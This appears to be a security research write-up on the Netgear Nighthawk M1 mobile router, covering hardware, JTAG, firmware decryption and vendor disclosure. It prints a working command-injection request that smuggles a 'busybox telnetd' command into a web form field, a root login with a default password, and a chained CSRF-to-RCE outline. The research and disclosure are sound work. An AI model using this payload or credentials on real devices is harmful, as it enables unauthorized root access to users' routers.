# Netgear Nighthawk M1 - Hardware and Security Analysis

## Hardware Highlights
- **Qualcomm MDM9250**: A relatively new chipset.
- **Nanya NM1484KSLAXAJ-3B**: A combination NAND/RAM chip (familiar to many).
- **Generic Test Pads**: For potential debugging or testing purposes.
- **USB-C Interface**: For data transfer and charging.

## Initial Challenges
- **Community Feedback**: There are numerous reports of user frustration on 4pda.ru forums.
- **GPL Tarball**: A ~300MB tarball containing patches for firmware version “02.02_00” is available, but it is not particularly useful.

## Entry Points
- **Web Server**: Accessible via TCP/80.
- **AT Shell**: Available via (USB) TCP/5510, but limited in functionality.
- **No Obvious Legitimate Entry**: All firmware files appear to be encrypted, making direct access challenging.

## Potential Similarities
- **Sierra Wireless Based**: The device likely shares similarities with the AirCard 7XX or 8XX series, which could provide some insights.

## JTAG Access
- **JTAG Interface**: Identified using jtagenum.
- **Connection**: Use a J-Link as a generic Cortex M3.
- **Pins**: TCK, TDI, nTRST, TMS, TDO, RTCK, VREF.

### Example JTAG Output
```bash
$ xxd -r -p 0x0-.hex | strings -n8
San Diego1
CDMA Technologies1
QUALCOMM1
QPSA F4 TEST CA0
180328182825Z
380323182825Z0
SecTools Test User1
San Diego1
SecTools1
California1"0 
01 0000000000000000 SW_ID1"0 
02 0000000000000000 HW_ID1
04 0000 OEM_ID1
05 00000108 SW_SIZE1
06 0000 MODEL_ID1
07 0001 SHA2561"0 
03 0000000000000002 DEBUG0
California1
...
```

## AT Shell
- **Limited Functionality**: No privileged AT!ENTERCND mode or classic ADB-enabling AT commands.
- **Flash Mode**: AT!BOOTHOLD command puts the device into a Qualcomm flash mode variant.

### Example AT Shell Interaction
```bash
$ telnet 192.168.1.1 5510
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.
ATI
Manufacturer: Netgear, Incorporated
Model: MR1100
Revision: NTG9X50C_12.06.03.00 r3480 ntgrbc-fwbuild2 2018/10/12 11:29:56
IMEI: 359126080593965
IMEI SV: 10
FSN: 5D6389N600760
+GCAP: +CGSM,+DS,+ES
ERROR
AT!GIVEMEASHELLPLEASE
ERROR
```

## Sierra Wireless fdt.exe
- **Tool Usage**: Can be used by unpacking other Sierra Wireless firmware install exes (use 7z).
- **Interface**: Pure USB, requires AC78xSDrivers.exe.
- **Firmware Encryption**: Encrypted, so not a useful entry point.

## Firmware Encryption
- **Encryption Method**: Mix of XOR and AES in ECB mode.
- **File Structure**: Follows a generic Sierra Wireless file structure.
- **Chunk Headers**: AES ECB encrypted.
- **Chunk Data**: XOR encrypted with a key offset by chunk size mod 32.

### Decryption Script
```bash
$ python netgear_fwtool.py ../MR1100-100EUS_23113509_NTG9x50C_12.06.03.00_00_Generic_05.01.secc.spk
[LOG] using file MR1100-100EUS_23113509_NTG9x50C_12.06.03.00_00_Generic_05.01.secc.spk
[LOG] file is 0x6856c23 long
[LOG] chunk start: 0x190, length 0x579f0, end 0x57b80
[DBG] (len-header % 32: 0?)
[DBG] key start: , key end: c9c9bcbf53914ffbb180b0c366db1743b8cd9aafdacba3ffd099e28a2dd2f2ac
...
```

## Firmware Contents
- **BOOT**: Bootloader
- **MODM**: Qualcomm DSP, TZ, RPM
- **APPL**: Linux system applications
- **HDAT**: /mnt/hdata = webapp root
- **SPLA**: Android splashscreen
- **FILE**: Generic global APN configs

## Security Vulnerabilities
### CSRF Bypass
- **Dynamic JSON Files**: Most config/mutable info is pulled from dynamically-generated JSON files.
- **NetgearStrings.js**: Also dynamically generated, with a TODO comment at the top.

### Command Injection
- **API Call Format**:
  ```http
  POST /Forms/config HTTP/1.1
  Host: 192.168.1.1
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
  Accept: */*
  Accept-Language: en-GB,en;q=0.5
  Accept-Encoding: gzip, deflate
  Referer: http://192.168.1.1/index.html
  Content-type: application/x-www-form-urlencoded
  Content-Length: 113
  Cookie: sessionId=0000000d-bW1XS27NZzc39egmHaPFXRP9vuZl3wp
  Connection: close
  general.shutdown=restart&err_redirect=/error.json&ok_redirect=/success.json&token=k8BKKSfEUxxMlrrFaCyQgGuTMGRSbnl
  ```

- **Example Exploit**:
  ```http
  POST /Forms/config HTTP/1.1
  Host: 192.168.1.1
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Referer: http://192.168.1.1/index.html
  Content-type: application/x-www-form-urlencoded
  Content-Length: 143
  Cookie: sessionId=00000008-8CKtg8jB5TJ0WhJALlbTXIdplP9wDZs
  Connection: close
  ready.deviceShare.removeUsbDevice=;$(busybox telnetd);
  &err_redirect=/error.json&ok_redirect=/success.json&token=kMOvNyZv6Jh4dHTOELKhMGuBNMUlXZ6
  ```

- **Root Shell Access**:
  ```bash
  $ telnet 192.168.1.1
  Trying 192.168.1.1...
  Connected to 192.168.1.1.
  Escape character is '^]'.
  msm 201810121151 mdm9650
  mdm9650 login: root
  Password: oelinux123
  root@mdm9650:~# 
  ```

## Chaining Exploits
- **Steps**:
  1. Grab CSRF token from NetgearStrings.js.
  2. Cross-site login/brute-force password.
  3. Check user privilege by reloading NetgearStrings.js.
  4. Post-auth command injection if priv = Admin.

## Vendor Response
- **Disclosure**: Netgear is difficult to disclose to, with reported issues in February still unresolved.
- **Post-Auth RCE**: Not considered serious.
- **Encryption Issues**: Unlikely to be fixed, but root password will be changed.

## Further Reading
- **More Information**: [ptp.sh/netgear_m1](https://ptp.sh/netgear_m1)
- **Additional Resources**: [4pda.ru Forum Thread](https://4pda.ru/forum/index.php?showtopic=778715), [ZTE, Netgear & TP-Link Issues](https://ptp.sh/dc27_4g)

## Acknowledgments
- **Pen Test Partners**: Jamie Riden and others.
- **Community Contributions**: Everyone on the 4pda.ru forum.

This document provides a comprehensive overview of the hardware, security, and potential vulnerabilities of the Netgear Nighthawk M1.